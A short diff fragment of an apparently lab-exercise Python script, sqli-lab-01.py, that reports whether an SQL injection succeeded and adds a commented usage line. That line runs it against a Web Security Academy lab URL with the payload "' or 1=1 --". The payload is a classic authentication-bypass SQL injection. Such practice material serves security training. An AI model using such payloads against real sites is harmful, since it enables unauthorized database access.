@@ -26,3 +26,5 @@ if exploit_sqli(url, payload):
     print("[+] SQL injection successful!")
 else:
     print("[-] SQL injection unsuccessful!")
+    
+#python sqli-lab-01.py https://ac2e1fbd1eadf724c0d0060800e600c5.web-security-academy.net "' or 1=1 --"
